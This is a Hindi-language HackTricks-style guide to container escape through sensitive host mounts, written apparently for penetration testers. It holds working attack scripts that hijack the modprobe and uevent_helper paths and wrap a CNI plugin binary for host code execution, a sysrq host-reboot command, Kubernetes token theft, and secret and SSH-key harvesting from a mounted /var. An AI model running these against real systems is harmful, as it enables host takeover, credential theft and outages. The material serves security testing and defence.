# संवेदनशील Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

Host mounts container-escape के सबसे महत्वपूर्ण व्यावहारिक surfaces में से हैं, क्योंकि वे अक्सर सावधानी से अलग किए गए process view को फिर से host resources तक सीधी पहुँच में बदल देते हैं। ख़तरनाक मामले केवल `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state या device-related paths के bind mounts से kernel controls, credentials, पड़ोसी containers के filesystems और runtime management interfaces उजागर हो सकते हैं।

यह पेज अलग-अलग protection pages से अलग रखा गया है, क्योंकि इसका abuse model कई क्षेत्रों में फैला हुआ है। Writable host mount ख़तरनाक होने का कारण कुछ हद तक mount namespaces, कुछ हद तक user namespaces, कुछ हद तक AppArmor या SELinux coverage, और कुछ हद तक उजागर किए गए सटीक host path पर निर्भर करता है। इसे एक अलग विषय के रूप में देखने से attack surface को समझना काफ़ी आसान हो जाता है।

हर container के अंदर के संबंधित path से host-writable directory की तुलना भी करें। अगर इसे executable startup scripts वाली directory पर mount किया गया है, तो कम privileges वाला host user ऐसा code रख सकता है जिसे अधिक privileges वाला container entrypoint अगले restart पर load करे। सटीक bind source और destination, directory की write/search permissions, entrypoint loop और executable-file की आवश्यकता, runtime UID, और restart का वास्तविक trigger सत्यापित करें। Container UID 0 का अर्थ अपने-आप host UID 0 नहीं होता; host पर प्रभाव user-namespace mapping और mount policy से तय होता है। Passive review में script लिखे या workload restart किए बिना paths और permissions की रिपोर्ट करें।

Linux container किसी management VM के भीतर हो सकता है, जो अलग Windows host के filesystem का कुछ हिस्सा share करती हो। [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) वह एक तरीका है जिससे host files guest में दिखाई दे सकती हैं, लेकिन उस VM में root होना अब भी Windows administrator से अलग identity है। अगर share में किसी readable user की SSH private key दिखाई देती है, तो इसे credential lead मानें: निष्कर्ष निकालने से पहले कि इससे host login संभव है, सटीक host-backed mount, key का ownership और access, संबंधित account, और Windows SSH server की **effective** authorized-key policy सत्यापित करें। आधुनिक [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) अक्सर administrator accounts के लिए अलग `administrators_authorized_keys` file का उपयोग करता है। नियमित enumeration output में private-key की सामग्री शामिल न करें; passive triage के लिए mount और key-path metadata पर्याप्त हैं।

## `/proc` का Exposure

procfs में सामान्य process information और उच्च-प्रभाव वाले kernel control interfaces, दोनों होते हैं। इसलिए `-v /proc:/host/proc` जैसा bind mount, या ऐसा container view जो अप्रत्याशित writable proc entries उजागर करे, information disclosure, denial of service या सीधे host code execution का कारण बन सकता है।

अधिक मूल्यवान procfs paths में शामिल हैं:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (विशेषकर `register` और `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### दुरुपयोग

सबसे पहले जाँचें कि कौन-सी अधिक मूल्यवान procfs entries दिखाई दे रही हैं या writable हैं:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

ये paths अलग-अलग कारणों से दिलचस्प हैं। `core_pattern`, `modprobe`, और `binfmt_misc` writable होने पर host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए शक्तिशाली reconnaissance स्रोत हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem का context उजागर करते हैं, जिससे container के अंदर से host layout का पुनर्निर्माण करने में मदद मिल सकती है।

हर path का व्यावहारिक महत्व अलग है। उन सभी को एक जैसा प्रभाव डालने वाला मानने से triage करना कठिन हो जाता है:

- `/proc/sys/kernel/core_pattern`
  अगर यह writable है, तो यह सबसे अधिक प्रभाव वाले procfs paths में से एक है, क्योंकि crash के बाद kernel एक pipe handler execute करेगा। ऐसा container जो `core_pattern` को अपने overlay या mounted host path में मौजूद payload की ओर point कर सके, अक्सर host code execution हासिल कर सकता है। एक समर्पित उदाहरण के लिए [read-only-paths.md](protections/read-only-paths.md) भी देखें।
- `/proc/sys/kernel/modprobe`
  यह path उस userspace helper को नियंत्रित करता है जिसका उपयोग kernel module-loading logic चलाने के लिए करता है। अगर यह container से writable हो और host context में interpret किया जाए, तो यह host code execution का एक और primitive बन सकता है। यह खास तौर पर तब दिलचस्प होता है, जब helper path को trigger करने का कोई तरीका भी मौजूद हो।
- `/proc/sys/vm/panic_on_oom`
  यह आम तौर पर कोई साफ-सुथरा escape primitive नहीं है, लेकिन OOM conditions को kernel panic behavior में बदलकर memory pressure को host-wide denial of service में बदल सकता है।
- `/proc/sys/fs/binfmt_misc`
  अगर registration interface writable है, तो attacker चुने हुए magic value के लिए handler register कर सकता है और matching file execute होने पर host-context execution हासिल कर सकता है।
- `/proc/config.gz`
  Kernel exploit triage के लिए उपयोगी। Host package metadata की ज़रूरत के बिना यह पता लगाने में मदद करता है कि कौन-से subsystems, mitigations, और optional kernel features enabled हैं।
- `/proc/sysrq-trigger`
  मुख्यतः denial-of-service path है, लेकिन बहुत गंभीर है। यह तुरंत host को reboot, panic या अन्य तरीकों से बाधित कर सकता है।
- `/proc/kmsg`
  Kernel ring buffer messages उजागर करता है। Host fingerprinting, crash analysis, और कुछ environments में kernel exploitation के लिए उपयोगी जानकारी leak करने में मददगार है।
- `/proc/kallsyms`
  Readable होने पर उपयोगी है, क्योंकि यह exported kernel symbol information उजागर करता है और kernel exploit development के दौरान address randomization से जुड़ी धारणाओं को निष्प्रभावी करने में मदद कर सकता है।
- `/proc/[pid]/mem`
  यह process memory का सीधा interface है। अगर target process तक आवश्यक ptrace-style conditions के साथ पहुँचा जा सके, तो इससे किसी दूसरे process की memory पढ़ी या बदली जा सकती है। वास्तविक प्रभाव credentials, `hidepid`, Yama, और ptrace restrictions पर काफी निर्भर करता है, इसलिए यह शक्तिशाली लेकिन शर्तों पर निर्भर path है।
- `/proc/kcore`
  System memory का core-image-style view उजागर करता है। यह file बहुत बड़ी है और इसका उपयोग करना असुविधाजनक है, लेकिन अगर इसे सार्थक रूप से पढ़ा जा सके, तो यह host memory surface के गंभीर रूप से exposed होने का संकेत है।
- `/dev/kmem` और `/dev/mem`
  ये ऐतिहासिक रूप से उच्च-प्रभाव वाले raw-memory **device** interfaces हैं, procfs files नहीं। कई आधुनिक systems में ये मौजूद नहीं होते या इन पर कड़ी पाबंदियाँ होती हैं, लेकिन जो container host-mounted copy खोल सकता हो, उसे इस exposure को critical मानना चाहिए। इनकी समीक्षा अन्य sensitive `/dev` mounts के साथ करें; `/proc/kmem` या `/proc/mem` जैसे गैर-मौजूद paths खोजने के बजाय।
- `/proc/sched_debug`
  Scheduling और task की जानकारी leak करता है, जिससे host process identities उजागर हो सकती हैं—भले ही अन्य process views अपेक्षा से अधिक साफ़ दिखें।
- `/proc/[pid]/mountinfo`
  यह पता लगाने के लिए बेहद उपयोगी है कि container वास्तव में host पर कहाँ स्थित है, कौन-से paths overlay-backed हैं, और क्या writable mount host content से जुड़ा है या सिर्फ container layer से।

अगर `/proc/[pid]/mountinfo` या overlay details पढ़ी जा सकती हों, तो इनका उपयोग container filesystem का host path पता लगाने के लिए करें:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

ये commands उपयोगी हैं क्योंकि host-execution की कई tricks के लिए container के अंदर के path को host के नज़रिए से उसके अनुरूप path में बदलना पड़ता है।

### उदाहरण: `modprobe` Helper Path तैयार करना

अगर container से `/proc/sys/kernel/modprobe` writable है और helper path को host context में interpret किया जाता है, तो उसे attacker-controlled payload पर redirect किया जा सकता है। Overlay upper directory का host से resolve होना ज़रूरी है, और अगर container host का `/tmp` भी mount नहीं करता, तो proof output को उसी host-visible container layer में वापस लिखना होगा:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

सटीक trigger, target और kernel के व्यवहार पर निर्भर करता है, इसलिए जानबूझकर इसका अनुमान नहीं लगाया गया है। Lab छोड़ने से पहले मूल value बहाल करें। अहम बात यह है कि writable helper path, kernel helper के भविष्य के invocation को attacker-controlled host-path content की ओर redirect कर सकता है। Missing overlay `upperdir`, ऐसा path जिसे host resolve न कर सके, read-only sysctl mount, या ऐसा kernel जो चुने गए helper को कभी invoke न करे—इस chain को तोड़ देता है।

### पूरा उदाहरण: `kallsyms`, `kmsg` और `config.gz` के साथ Kernel Recon

अगर लक्ष्य तत्काल escape के बजाय exploitability का आकलन करना है:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

ये कमांड यह पता लगाने में मदद करते हैं कि उपयोगी symbol जानकारी दिखाई दे रही है या नहीं, हाल के kernel messages से कोई दिलचस्प स्थिति सामने आती है या नहीं, और kernel की कौन-सी सुविधाएँ या mitigations compile की गई हैं। आमतौर पर इसका प्रभाव सीधे escape करना नहीं होता, लेकिन इससे kernel vulnerability की जाँच का समय काफी कम हो सकता है।

### पूर्ण उदाहरण: SysRq होस्ट रीबूट

अगर `/proc/sysrq-trigger` लिखने योग्य है और host view तक पहुँचता है:

```bash
echo b > /proc/sysrq-trigger
```

इसका प्रभाव तुरंत host reboot होना है। यह कोई सूक्ष्म उदाहरण नहीं है, लेकिन यह स्पष्ट रूप से दिखाता है कि procfs का exposure केवल information disclosure से कहीं अधिक गंभीर हो सकता है।

## `/sys` Exposure

sysfs बड़ी मात्रा में kernel और device की स्थिति expose करता है। कुछ sysfs paths मुख्य रूप से fingerprinting के लिए उपयोगी हैं, जबकि अन्य helper execution, device behavior, security-module configuration या firmware state को प्रभावित कर सकते हैं।

उच्च-महत्त्व वाले sysfs paths में शामिल हैं:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

ये paths अलग-अलग कारणों से महत्त्वपूर्ण हैं। `/sys/class/thermal` thermal-management behavior को प्रभावित कर सकता है और इसलिए गलत तरीके से expose किए गए environments में host stability को प्रभावित कर सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout की ऐसी जानकारी leak कर सकता है जो low-level host fingerprinting में मदद करती है। `/sys/kernel/security`, Linux Security Modules द्वारा इस्तेमाल किया जाने वाला `securityfs` interface है, इसलिए वहाँ अनपेक्षित access से MAC-संबंधी state उजागर हो सकती है या उसमें बदलाव हो सकता है। EFI variable paths firmware-backed boot settings को प्रभावित कर सकते हैं, जिससे वे सामान्य configuration files से कहीं अधिक गंभीर हो जाते हैं। `/sys/kernel/debug` के अंतर्गत `debugfs` विशेष रूप से खतरनाक है, क्योंकि यह जानबूझकर developer-oriented interface के रूप में बनाया गया है और इसमें hardened, production-facing kernel APIs की तुलना में सुरक्षा की अपेक्षाएँ बहुत कम हैं।

इस सूची की हर sysfs entry **kernel-, configuration- और hardware-dependent** है। मौजूदा virtualized nodes में अक्सर `uevent_helper`, EFI variables और thermal-device entries पूरी तरह अनुपस्थित होते हैं। अनुपस्थित path को किसी नकारात्मक prerequisite के रूप में दर्ज करें; यह न मानें कि किसी दूसरे kernel का उदाहरण यहाँ भी लागू होगा।

इन paths की समीक्षा के लिए उपयोगी commands हैं:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

इन commands को दिलचस्प क्या बनाता है:

- `/sys/kernel/security` से पता चल सकता है कि AppArmor, SELinux या कोई अन्य LSM surface ऐसे दिखाई दे रहा है जिसे केवल host तक सीमित रहना चाहिए था।
- `/sys/kernel/debug` इस समूह में अक्सर सबसे चिंताजनक खोज होती है। यदि `debugfs` mounted है और readable या writable है, तो kernel-facing एक विस्तृत surface की अपेक्षा करें, जिसका सटीक जोखिम enabled debug nodes पर निर्भर करता है।
- EFI variable exposure कम आम है, लेकिन मौजूद होने पर इसका प्रभाव अधिक होता है, क्योंकि यह सामान्य runtime files के बजाय firmware-backed settings तक पहुँचता है।
- `/sys/class/thermal` मुख्य रूप से host stability और hardware interaction के लिए प्रासंगिक है, न कि shell-जैसे escape के लिए।
- `/sys/kernel/vmcoreinfo` मुख्य रूप से host-fingerprinting और crash-analysis का स्रोत है, जो low-level kernel state समझने में उपयोगी है।

### पूरा उदाहरण: `uevent_helper`

`/sys/kernel/uevent_helper` kernel और configuration पर निर्भर करता है और कई मौजूदा systems में मौजूद नहीं होता। यदि यह मौजूद है, writable है और कोई usable `uevent` trigger उपलब्ध है, तो kernel attacker-controlled helper को execute कर सकता है। Proof output के लिए ऐसा path इस्तेमाल करना होगा जो host और container, दोनों views से दिखाई दे:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

इसका काम करने का कारण यह है कि helper path की व्याख्या host के नज़रिये से की जाती है। ट्रिगर होने के बाद, helper मौजूदा container के अंदर नहीं, बल्कि host context में चलता है। `/sys/class/mem/null/uevent` उन kernels पर एक ठोस trigger है जो इसे उपलब्ध कराते हैं; अन्य devices की अपनी `uevent` files हो सकती हैं, लेकिन वास्तविक hardware पर बिना जाँच के कोई एक न चुनें। Lab से बाहर निकलने से पहले मूल value बहाल करें। यदि helper file या नियंत्रित trigger मौजूद न हो, तो इस technique को उपलब्ध न बताएं।

## `/var` का एक्सपोज़र

Container में host का `/var` mount करने के जोखिम को अक्सर कम आँका जाता है, क्योंकि यह `/` mount करने जितना नाटकीय नहीं लगता। व्यवहार में, यह runtime sockets, container snapshot directories, kubelet द्वारा प्रबंधित pod volumes, projected service-account tokens और आस-पास के application filesystems तक पहुँचने के लिए पर्याप्त हो सकता है। आधुनिक nodes पर, अक्सर `/var` में ही container state का सबसे अधिक operational रूप से दिलचस्प हिस्सा मौजूद होता है।

### Kubernetes उदाहरण

`hostPath: /var` वाला pod अक्सर दूसरे pods के projected tokens और overlay snapshot content पढ़ सकता है:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

ये commands उपयोगी हैं, क्योंकि इनसे पता चलता है कि mount केवल सामान्य application data उजागर करता है या उच्च-प्रभाव वाले cluster credentials। पढ़ा जा सकने वाला service-account token, local code execution को तुरंत Kubernetes API access में बदल सकता है।

अगर token मौजूद है, तो केवल token खोजने पर न रुकें; जाँचें कि उससे किन संसाधनों तक पहुँचा जा सकता है:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

यहाँ इसका प्रभाव local node access से कहीं बड़ा हो सकता है। व्यापक RBAC वाला token, माउंट किए गए `/var` को पूरे cluster के compromise में बदल सकता है।

### Docker और containerd का उदाहरण

Docker hosts पर संबंधित data अक्सर `/var/lib/docker` में होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths में हो सकता है:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

यदि mounted `/var` किसी अन्य workload के writable snapshot contents को उजागर करता है, तो attacker मौजूदा container configuration को छुए बिना application files में बदलाव कर सकता है, web content रख सकता है या startup scripts बदल सकता है।

**डिस्पोज़ेबल lab workload** पर writable snapshot content से application tampering, secret recovery या lateral movement प्रदर्शित किया जा सकता है। पहले runtime container ID को सटीक snapshot से map करें और किसी असंबंधित या production snapshot को कभी edit न करें:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

ये commands उपयोगी हैं, क्योंकि ये mounted `/var` के प्रभाव की तीन मुख्य श्रेणियाँ दिखाते हैं: application tampering, secret recovery, और पड़ोसी workloads में lateral movement।

सीधे snapshot writes runtime के सामान्य state management को bypass कर सकते हैं और container को corrupt कर सकते हैं या evidence नष्ट कर सकते हैं। Read-only discovery को Docker `overlay2` के विरुद्ध स्थानीय रूप से दोहराया गया: पड़ोसी disposable container में लिखा गया marker `/var/lib/docker/overlay2/<id>/diff/` के नीचे दिखाई दिया। वास्तविक snapshot modification को केवल उस test के लिए बनाए गए disposable container तक सीमित रखें।

## Kubelet State, Plugins, और CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin`, या `/etc/cni/net.d` का mount अक्सर privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, और storage helpers के माध्यम से exposed होता है। इन mounts को "node plumbing" कहकर आसानी से नज़रअंदाज़ किया जा सकता है, लेकिन ये नए pods के execution path में सीधे होते हैं और इनमें अक्सर kubelet credentials, projected secrets, registration sockets, और host-side plugin के executable binaries होते हैं।

उच्च-मूल्य वाले targets में शामिल हैं:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

समीक्षा के लिए उपयोगी commands हैं:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

ये paths क्यों महत्वपूर्ण हैं:

- `/var/lib/kubelet/pki` से kubelet client certificates और अन्य node-local credentials उजागर हो सकते हैं, जिनका cluster design के आधार पर कभी-कभी API server या kubelet-facing TLS endpoints के विरुद्ध फिर से उपयोग किया जा सकता है।<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` में अक्सर उसी node पर मौजूद पड़ोसी pods के लिए projected service-account tokens और mounted Secrets होते हैं।
- `/var/lib/kubelet/pod-resources/kubelet.sock` मुख्य रूप से reconnaissance का एक माध्यम है, लेकिन बहुत उपयोगी है: इससे पता चलता है कि वर्तमान में कौन-से pods और containers GPUs, hugepages, SR-IOV devices और node-local के अन्य दुर्लभ resources का उपयोग कर रहे हैं।<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` और `/var/lib/kubelet/plugins_registry` से पता चलता है कि कौन-से CSI, DRA और device plugins इंस्टॉल हैं और kubelet को किन sockets से बात करनी है। अगर ये directories केवल पढ़ने योग्य होने के बजाय लिखने योग्य हों, तो यह finding कहीं अधिक गंभीर हो जाती है।<sup>[[1]](#references)</sup>
- `/opt/cni/bin` और `/etc/cni/net.d` सीधे pod-network setup path का हिस्सा हैं। वहाँ write access मिलना अक्सर केवल configuration उजागर होने के बजाय, देर से मिलने वाला host-execution primitive होता है।<sup>[[2]](#references)</sup>

### पूरा उदाहरण: Writable `/opt/cni/bin`

अगर host CNI binary directory read-write के रूप में mount की गई हो, तो किसी plugin को बदलना ही अगली बार उस node पर kubelet द्वारा pod sandbox बनाए जाने पर host execution पाने के लिए पर्याप्त हो सकता है:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

यह mounted `docker.sock` जितना तुरंत असरदार नहीं है, लेकिन compromised Kubernetes infrastructure pods में अक्सर अधिक वास्तविक स्थिति होती है। Marker को mounted plugin के बगल में लिखा जाता है, ताकि container उसे host-root या host-`/tmp` mount के बिना भी प्राप्त कर सके। Wrapper मूल arguments और standard input को बनाए रखता है, फिर उदाहरण मूल binary को restore करता है। महत्वपूर्ण बात यह है कि modified binary को बाद में host के network setup flow द्वारा execute किया जाता है, न कि मौजूदा container द्वारा। केवल disposable node का उपयोग करें, क्योंकि invalid wrapper नए Pod sandboxes को networking मिलने से रोक सकता है।

## Runtime Sockets

Sensitive host mounts में अक्सर पूरी directories के बजाय runtime sockets शामिल होते हैं। ये इतने महत्वपूर्ण हैं कि यहाँ इन्हें स्पष्ट रूप से दोहराना ज़रूरी है:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

इनमें से कोई एक socket mount हो जाने के बाद पूरे exploitation flows के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

एक त्वरित शुरुआती interaction pattern के रूप में:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

यदि इनमें से कोई सफल होता है, तो "mounted socket" से "अधिक privileged sibling container शुरू करने" तक का रास्ता आमतौर पर किसी भी kernel breakout path से बहुत छोटा होता है।

इसी daemon access से **host persistence** भी स्थापित की जा सकती है। writable host-root bind mount वाला helper container `docker cp` के ज़रिए files प्राप्त कर सकता है, फिर mounted host path के अंतर्गत SSH key, service unit या कोई अन्य persistence file रखने के लिए `docker exec` का उपयोग कर सकता है। सुरक्षा सीमा host mount बनाने के daemon के अधिकार में है; `docker cp` केवल staging का कदम है। Runtime socket expose होने के बाद नए बनाए गए containers और host authentication या startup paths पर हुए writes—दोनों का audit करें।

## Writable Host Path Task Hijack

खतरनाक होने के लिए writable host mount का `/` expose करना ज़रूरी नहीं है। यदि mounted path में ऐसे scripts, config files, hooks, plugins या files मौजूद हैं जिन्हें बाद में host-side scheduled task या service इस्तेमाल करती है, तो container यह बदल सकता है कि host क्या execute करता है।

सामान्य review flow:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

यदि होस्ट प्रक्रिया किसी लिखने योग्य फ़ाइल का उपयोग करती है, तो परीक्षण के दौरान payload को सरल और आसानी से दिखाई देने वाला रखें:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

दिलचस्प पहलू trust boundary है: write container के अंदर से होता है, लेकिन execution बाद में host service context में होता है। इससे सीमित hostPath या bind mount, host पर code execution कराने का delayed primitive बन जाता है।

## साझा Host Path पर Root-Owned Files

जिस container account को root बनने की अनुमति है, वह किसी ऐसे writable path पर root-owned file रख सकता है जिसका उपयोग host भी करता है। यदि container UID 0, host UID 0 से map होता है, तो दोनों views एक ही file को संदर्भित करते हैं, और host mount SUID execution की अनुमति देता है, तो उस path पर root-owned SUID executable चला सकने वाला host user, host privilege boundary पार कर सकता है। इस खास file-ownership समस्या के लिए container को `--privileged` के साथ चलाना ज़रूरी नहीं है। अलग-अलग शर्तों के लिए [user namespace mappings](protections/namespaces/user-namespace.md) और [SUID चर्चा](privileged-containers.md) देखें।

Path की **दोनों ओर से** जाँच करें: किसी benign file का ownership और identity मिलाएँ, container के `uid_map` और `gid_map` जाँचें, और host के mount options तथा execution policy देखें। Container-side `rw` और `nosuid` की अनुपस्थिति केवल एक संभावित मामला है; इससे host ownership, host mount flags, host user की access या यह साबित नहीं होता कि AppArmor/SELinux execution को रोकते हैं या नहीं। `noexec` उस view में execution को सीमित करता है जहाँ यह लागू होता है। `/proc/self/mountinfo` में `shared:` और `master:` tags mount propagation बताते हैं, यह नहीं कि file का content host के साथ shared है या नहीं। Bind mount में ये tags हो भी नहीं सकते हैं। Host login देने वाला credential reuse, shared-file privilege boundary से अलग कदम है।

Host का runtime storage, स्पष्ट bind mount के बिना भी ऐसा ही path बना सकता है। [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) के कारण unprivileged host user, Docker data subdirectories में जा सकता था और container filesystem से files execute कर सकता था; Moby ने 20.10.9 में permissions ठीक कीं और बताया कि directories सुधारने के लिए चल रहे containers को restart करना होगा। सटीक mounted `overlay2/<id>/merged` paths और हर parent की search permission जाँचें, फिर पुष्टि करें कि container UID 0, host UID 0 से map होता है या नहीं, कोई वास्तविक root-owned SetUID executable मौजूद और पहुँच योग्य है या नहीं, और host view SetUID execution की अनुमति देता है या नहीं। Rootless या user-namespace-remapped containers, `nosuid`, `noexec`, `no_new_privs` और MAC policy नतीजा बदल सकते हैं। केवल runtime version या traversable path, जाँच का सुराग है—host-root execution का प्रमाण नहीं; किसी संभावित executable को चलाए बिना mount और file metadata की जाँच करें।

## Mount से जुड़े CVEs

Host mounts, runtime vulnerabilities से भी जुड़े होते हैं। हाल के महत्वपूर्ण उदाहरण:

- `runc` में `CVE-2024-21626`, जहाँ leak हुए directory file descriptor के कारण working directory host filesystem पर जा सकती थी।
- BuildKit में `CVE-2024-23651`, `CVE-2024-23652` और `CVE-2024-23653`, जहाँ malicious Dockerfiles, frontends और `RUN --mount` flows, builds के दौरान host file access, deletion या elevated privileges को फिर से संभव कर सकते थे।
- Buildah और Podman build flows में `CVE-2024-1753`, जहाँ build के दौरान crafted bind mounts से `/` को read-write के रूप में उजागर किया जा सकता था।
- `containerd` 2.1.0 में `CVE-2025-47290`, जहाँ image unpack के दौरान TOCTOU के कारण विशेष रूप से crafted image, pull के दौरान host filesystem को modify कर सकती थी।

ये CVEs यहाँ इसलिए महत्वपूर्ण हैं क्योंकि वे दिखाते हैं कि mount handling केवल operator configuration का मामला नहीं है। Runtime स्वयं भी mount-आधारित escape conditions पैदा कर सकता है।

## जाँच

सबसे जोखिमपूर्ण mount exposures को जल्दी खोजने के लिए ये commands इस्तेमाल करें:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

यहाँ क्या दिलचस्प है:

- Host root, `/proc`, `/sys`, `/var` और runtime sockets सभी उच्च-प्राथमिकता वाली findings हैं।
